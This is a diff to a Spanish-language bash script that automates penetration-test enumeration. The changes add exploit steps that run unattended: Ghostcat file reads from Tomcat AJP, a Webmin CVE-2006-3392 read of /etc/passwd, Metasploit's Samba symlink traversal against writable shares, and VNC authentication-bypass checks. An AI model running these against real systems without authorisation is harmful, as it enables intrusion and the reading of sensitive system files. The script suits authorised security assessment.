@@ -1118,7 +1118,7 @@ cd .escaneo_puertos
 
 	grep ":50000$" tcp.txt  | uniq >> ../servicios/jenkins.txt
 
-	grep ":10000$" tcp.txt  | uniq >> ../servicios/NDMP.txt 
+	grep ":10000$" tcp.txt  | uniq >> ../servicios/webmin.txt 
 	grep ":111$" tcp.txt  | uniq >> ../servicios/rpc.txt 
 	grep ":135$" tcp.txt  | uniq >> ../servicios/msrpc.txt 
 
@@ -1500,7 +1500,7 @@ then
 			echo -e "\t [+] Bruteforce domains"
 			echo "dnsenum --threads 100 --dnsserver $ip -f $common_domains $DOMINIO" > logs/enumeracion/"$ip"_dns_enum.txt 
 			dnsenum --threads 100 --dnsserver $ip -f $common_domains $DOMINIO | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >> logs/enumeracion/"$ip"_dns_enum.txt 2>/dev/null
-			grep -i $DOMINIO logs/enumeracion/"$ip"_dns_enum.txt | grep -v dnsenum > .enumeracion/"$ip"_dns_enum.txt
+			grep -i $DOMINIO logs/enumeracion/"$ip"_dns_enum.txt | egrep -v 'dnsenum|---' > .enumeracion/"$ip"_dns_enum.txt
 			
 			if [ $internet == "s" ]; then 			
 				#open resolver
@@ -1756,9 +1756,19 @@ if [ -f servicios/ajp13.txt ]
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 
-		echo "nmap -Pn --script=ajp-auth,ajp-headers,ajp-methods,ajp-request -p $port $ip" > logs/vulnerabilidades/"$ip"_ajp13_proxyAuth.txt 2>/dev/null
-		nmap -n -Pn --script=ajp-auth,ajp-headers,ajp-methods,ajp-request -p $port $ip >> logs/vulnerabilidades/"$ip"_ajp13_proxyAuth.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_ajp13_proxyAuth.txt > .vulnerabilidades/"$ip"_ajp13_proxyAuth.txt 
+		echo "nmap -Pn --script=ajp-auth,ajp-headers,ajp-methods,ajp-request -p $port $ip" > logs/enumeracion/"$ip"_ajp13_proxyAuth.txt 2>/dev/null
+		nmap -n -Pn --script=ajp-auth,ajp-headers,ajp-methods,ajp-request -p $port $ip >> logs/enumeracion/"$ip"_ajp13_proxyAuth.txt 2>/dev/null
+		grep "|" logs/enumeracion/"$ip"_ajp13_proxyAuth.txt > .enumeracion/"$ip"_ajp13_proxyAuth.txt 
+		
+		ghostcat.py -p $port -f /WEB-INF/web.xml $ip | strings > logs/vulnerabilidades/"$ip"_ajp13_ghostcat.txt 
+		egrep -iq "web-app" logs/vulnerabilidades/"$ip"_ajp13_ghostcat.txt
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then			
+			echo -e "\t$OKRED[!] Tomcat LFI \n $RESET"
+			cp logs/vulnerabilidades/"$ip"_ajp13_ghostcat.txt .vulnerabilidades/"$ip"_ajp13_ghostcat.txt 		
+		fi
+
+		
 		
 	done
 
@@ -1931,6 +1941,19 @@ if [ -f servicios/hadoop-tasktracker.txt ]
 	insert_data
 fi
 
+
+if [ -f servicios/webmin.txt ]
+	then
+	echo -e "$OKBLUE #################### webmin (`wc -l servicios/webmin.txt`) ######################$RESET"	    
+	for line in $(cat servicios/webmin.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo "memcstat --servers=$ip" > logs/vulnerabilidades/"$ip"_webmin_LFI.txt
+		webmin-CVE-2006-3392.sh $ip $port /etc/passwd >> logs/vulnerabilidades/"$ip"_webmin_LFI.txt
+		grep bash logs/vulnerabilidades/"$ip"_webmin_LFI.txt > .vulnerabilidades/"$ip"_webmin_LFI.txt				
+	done
+	insert_data
+fi
 
 if [ -f servicios/memcached.txt ]
 	then
@@ -2162,7 +2185,19 @@ then
 		grep --color=never "not required" logs/vulnerabilidades/"$ip"_445_smb2Security.txt > .vulnerabilidades/"$ip"_445_smb2Security.txt
 		egrep --color=never "READ|WRITE" logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt | sort | uniq | grep -v '\$' > .vulnerabilidades/"$ip"_445_compartidoSMB.txt		
 		egrep --color=never "Disk" logs/vulnerabilidades/"$ip"_445_compartidoSMBClient.txt | sort | uniq | grep -v '\$' > .vulnerabilidades/"$ip"_445_compartidoSMBClient.txt		
-		#smbclient --list //10.11.1.146/ -U
+
+
+		writable_shared=`egrep --color=never "WRITE" logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt | cut -d " " -f1-2 |tr -d '\t'` 
+
+		if [ ! -z "$writable_shared" ]; then
+			echo "Probando samba_symlink_traversal con $writable_shared"
+			msfconsole -x "use admin/smb/samba_symlink_traversal;set SMBSHARE '$writable_shared';set RHOSTS $ip;exploit;exit" > logs/vulnerabilidades/"$ip"_"$port"_symlinkTraversal.txt 2>/dev/null							   
+			grep "rootfs" logs/vulnerabilidades/"$ip"_"$port"_symlinkTraversal.txt | egrep -v "exploits|payloads|evasion|cowsay" | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  > .vulnerabilidades/"$ip"_"$port"_symlinkTraversal.txt
+			#######################		
+		fi		
+
+		
+		#smbclient --list //10.11.1.146/
 		################################										
 	done				
 	
@@ -2717,18 +2752,19 @@ then
 			echo -e "\tVNC bypass ($vnc_response)" > .vulnerabilidades/"$ip"_"$port"_VNCbypass.txt 
 		fi	
 		echo -e "\t[+] Verificando autenticación"
-		msfconsole -x "use auxiliary/scanner/vnc/vnc_none_auth;set RHOSTS $ip; set rport $port;run;exit" > logs/vulnerabilidades/"$ip"_VNC_nopass.txt 2>/dev/null		
-		egrep --color=never -i "None" logs/vulnerabilidades/"$ip"_VNC_nopass.txt | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > .vulnerabilidades/"$ip"_VNC_nopass.txt 
+		msfconsole -x "use auxiliary/scanner/vnc/vnc_none_auth;set RHOSTS $ip; set rport $port;run;exit" > logs/vulnerabilidades/"$ip"_"$port"_noauth.txt 2>/dev/null		
+		egrep --color=never -i "None" logs/vulnerabilidades/"$ip"_"$port"_noauth.txt | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > .vulnerabilidades/"$ip"_"$port"_noauth.txt
 		
 		echo -e "\t[+] Verificando info VNC"
-		echo "nmap -n -Pn -sT -p $port --script vnc-info,vnc-title $ip" > logs/enumeracion/"$ip"_vnc_info.txt 2>/dev/null
-		nmap -Pn -n -p $port --script vnc-info,realvnc-auth-bypass,vnc-title $ip >> logs/enumeracion/"$ip"_vnc_info.txt 2>/dev/null
-		grep "|" logs/enumeracion/"$ip"_vnc_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" >> .enumeracion/"$ip"_vnc_info.txt
+		echo "nmap -n -Pn -sT -p $port --script vnc-info,vnc-title $ip" > logs/enumeracion/"$ip"_"$port"_info.txt 2>/dev/null
+		nmap -Pn -n -p $port --script vnc-info,realvnc-auth-bypass,vnc-title $ip >> logs/enumeracion/"$ip"_"$port"_info.txt 2>/dev/null
+		grep "|" logs/enumeracion/"$ip"_"$port"_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" >> .enumeracion/"$ip"_"$port"_info.txt
+		grep -i "server does not require authentication" logs/enumeracion/"$ip"_"$port"_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" >> .vulnerabilidades/"$ip"_"$port"_noauth.txt
 
 
 		echo -e "\t[+] Verificando Vulnerabilidad de REALVNC"
 		echo "nmap -n -Pn -sT -p $port --script realvnc-auth-bypass $ip" > logs/vulnerabilidades/"$ip"_vnc_bypass.txt 2>/dev/null
-		nmap -Pn -n -p $port --script vnc-info,realvnc-auth-bypass,vnc-title $ip >> logs/vulnerabilidades/"$ip"_vnc_bypass.txt 2>/dev/null
+		nmap -Pn -n -p $port --script realvnc-auth-bypass $ip >> logs/vulnerabilidades/"$ip"_vnc_bypass.txt 2>/dev/null
 		grep "|" logs/vulnerabilidades/"$ip"_vnc_bypass.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" >> .vulnerabilidades/"$ip"_vnc_bypass.txt
 
 		#vncpwd <vnc password file>
@@ -5268,7 +5304,7 @@ for line in $(cat .enumeracion2/*webdirectorios.txt 2>/dev/null); do
 				ip=`echo $ip_port | cut -d ":" -f 1` #puede ser subdominio tb
 				port=`echo $ip_port | cut -d ":" -f 2`		
 			
-					if [[ (${path} != *"xmlrpc"* && ${path} != *"manual"* && ${path} != *"manual"* && ${path} != *"manual"* && ${path} != *"manual"* && ${path} != *"manual"* && ${path} != *"manual"*  && ${path} != *"manual"*  && ${path} != *"manual"* && ${path} != *"manual"* && ${path} != *"manual"* ) ]];then 
+					if [[ (${path} != *"xmlrpc"* && ${path} != *"manual"* && ${path} != *"dashboard"* && ${path} != *"docs"* && ${path} != *"manual"* && ${path} != *"manual"* && ${path} != *"manual"*  && ${path} != *"manual"*  && ${path} != *"manual"* && ${path} != *"manual"* && ${path} != *"manual"* ) ]];then 
 					echo -e "\t\t[+] Enumerando directorios de 2do nivel ($path)" 
 					web-buster.pl -t $ip -p $port -s $proto -h $hilos_web -d "/$path/" -m folders >> logs/enumeracion/"$ip"_"$port"_webdirectorios2.txt &
 										
@@ -5323,7 +5359,7 @@ then
 	while read ip       
 	do     	
 		echo "checking IP $ip "		
-		egrep -iq "Server doesn't allow session" logs/vulnerabilidades/"$ip"_445_enum4linux.txt 
+		egrep -iq "Server doesn't allow session|RID cycling not possible" logs/vulnerabilidades/"$ip"_445_enum4linux.txt 
 		greprc=$?
 		if [[ $greprc -eq 0  ]];then
 			echo -e "\t[-] No Null session "
